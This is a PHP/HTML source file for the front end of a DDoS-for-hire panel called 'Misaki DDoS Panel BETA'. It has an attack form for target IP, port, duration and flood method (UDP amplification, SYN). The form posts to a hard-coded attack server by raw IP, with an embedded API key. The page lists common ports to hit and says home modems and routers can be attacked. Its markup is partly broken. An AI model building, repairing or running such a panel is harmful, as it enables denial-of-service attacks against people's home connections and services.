<?php

require '../../global.php';

if(isset($_SESSION['admin'])) {
	if($_SESSION['admin'] == 'active') {
        if($_SESSION['account']['rank'] >= 5) 
        {
			
		} else {
			header('Location: index');
		}
		
	} else {
		header('Location: login');
	}
	
} else {
	header('Location: ../login');
}

$page = 'user';

?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		
		<title>Misaki Stresser BETA 1.0</title>

        <link rel="stylesheet" href="vendors/bower_components/material-design-iconic-font/dist/css/material-design-iconic-font.min.css">
        <link rel="stylesheet" href="vendors/bower_components/animate.css/animate.min.css">
        <link rel="stylesheet" href="vendors/bower_components/jquery.scrollbar/jquery.scrollbar.css">
        <link rel="stylesheet" href="vendors/bower_components/fullcalendar/dist/fullcalendar.min.css">
		<link rel="icon" href="img/favicon.ico">
        <link rel="stylesheet" href="css/app.min.css">
    </head>

    <body data-ma-theme="blue">
        <main class="main">
            <div class="page-loader">
                <div class="page-loader__spinner">
                    <svg viewBox="25 25 50 50">
                        <circle cx="50" cy="50" r="20" fill="none" stroke-width="2" stroke-miterlimit="10" />
                    </svg>
                </div>
            </div>

            <header class="header">
                <div class="navigation-trigger hidden-xl-up" data-ma-action="aside-open" data-ma-target=".sidebar">
                    <div class="navigation-trigger__inner">
                        <i class="navigation-trigger__line"></i>
                        <i class="navigation-trigger__line"></i>
                        <i class="navigation-trigger__line"></i>
                    </div>
                </div>

                <div class="header__logo hidden-sm-down">
                    <h1><a href="">Misaki DDoS Panel BETA</a></h1>
                </div>
            </header>

            <center>


            <form class="search">
                    <div class="search__inner">
                        <input type="text" class="search__text" placeholder="Rechercher un client">
                        <i class="zmdi zmdi-search search__helper" data-ma-action="search-close"></i>
                    </div>
                </form>

                <ul class="top-nav">
                    <li class="hidden-xl-up"><a href="" data-ma-action="search-open"><i class="zmdi zmdi-search"></i></a></li>
                </ul>
            </header>

            <section class="content">
            <br>
            <br>
            <br>
            <div class="col-md-6">
						<div class="card-demo">
							<div class="card">

								<div class="card-header">
									<h2 class="card-title"><b>Misaki DDoS Panel BETA V1.0</b></h2>
								</div>
						
								<div class="card-block">
									<div class="form-group">
                                    <form action="http://134.209.203.47/Misaki.php?key=MisakiServer007&host=&port=80&time=5&method=UDP" method="post">
										<label>IP</label>
										<input type="text" name="ip" class="form-control" placeholder="IP" value="">
										<i class="form-group__bar"></i>
									</div>
									<div class="form-group">
										<label>Port</label>
										<input type="text" name="port" class="form-control" placeholder="Port" value="">
										<i class="form-group__bar"></i>
									</div>
									<div class="form-group">
										<label>Time</label>
										<input type="text" name="time" class="form-control" placeholder="Time" value="">
										<i class="form-group__bar"></i>
									</div>
									<div class="form-group">
										<label>Methods</label>
										<select name="rank" class="form-control">
											<option ' . ($fetch['rank'] == '1' ? 'selected' : '') . ' value="1">UDP AMP</option>
											<option ' . ($fetch['rank'] == '2' ? 'selected' : '') . ' value="2">SSYN BASIC</option>
										</select>
									</div>
									<button class="btn btn-primary btn-block waves-effect">Send Attack</button>
									</form>
								</div>

							</div>
						</div>
					</div>

                    <br>
                    <br>
                    <b>Server Online: <b style="color:green">1</b>
                    <br>
                    <br>
                    <b>This DDoS Server was created By Misaki DEV, please don't spam it's can damage the server it's still in BETA !</b>
                    <br>
                    <br>
                    <b>Most used port is: 80 (HOME) | 8080 (HOME) | 53 (DNS) | 22 (SSH) | 21 (FTP) | 443 (HTTPS) |  7777 (VPN / NFO VPN)</b>
                    <br>   
                    <br>
                    <b>/!\ At this time, only modem / router home connection can be attacked ! /!\</b>
                    <br>
                    <br>
                <footer class="footer hidden-xs-down">
                <p>© <?= date('Y'); ?> DownCraft. Developed by Misaki Dev. All rights reserved.</p>
                </footer>
            </section>
        </main>
        </center>

        <script src="vendors/bower_components/jquery/dist/jquery.min.js"></script>
        <script src="vendors/bower_components/tether/dist/js/tether.min.js"></script>
        <script src="vendors/bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
        <script src="vendors/bower_components/Waves/dist/waves.min.js"></script>
        <script src="vendors/bower_components/jquery.scrollbar/jquery.scrollbar.min.js"></script>
        <script src="vendors/bower_components/jquery-scrollLock/jquery-scrollLock.min.js"></script>
        <script src="vendors/bower_components/Waves/dist/waves.min.js"></script>

        <script src="vendors/bower_components/flot/jquery.flot.js"></script>
        <script src="vendors/bower_components/flot/jquery.flot.resize.js"></script>
        <script src="vendors/bower_components/flot.curvedlines/curvedLines.js"></script>
        <script src="vendors/bower_components/jqvmap/dist/jquery.vmap.min.js"></script>
        <script src="vendors/bower_components/jqvmap/dist/maps/jquery.vmap.world.js"></script>
        <script src="vendors/bower_components/jquery.easy-pie-chart/dist/jquery.easypiechart.min.js"></script>
        <script src="vendors/bower_components/salvattore/dist/salvattore.min.js"></script>
        <script src="vendors/jquery.sparkline/jquery.sparkline.min.js"></script>
        <script src="vendors/bower_components/moment/min/moment.min.js"></script>
        <script src="vendors/bower_components/fullcalendar/dist/fullcalendar.min.js"></script>

        <script src="demo/js/flot-charts/curved-line.js"></script>
        <script src="demo/js/flot-charts/line.js"></script>
        <script src="demo/js/flot-charts/chart-tooltips.js"></script>
        <script src="demo/js/other-charts.js"></script>
        <script src="demo/js/jqvmap.js"></script>

        <script src="js/app.min.js"></script>
		<script src="vendors/bower_components/remarkable-bootstrap-notify/dist/bootstrap-notify.min.js"></script>
		<script src="js/adm/search.js"></script>
		<script src="js/adm/account.js"></script>
    </body>
</html>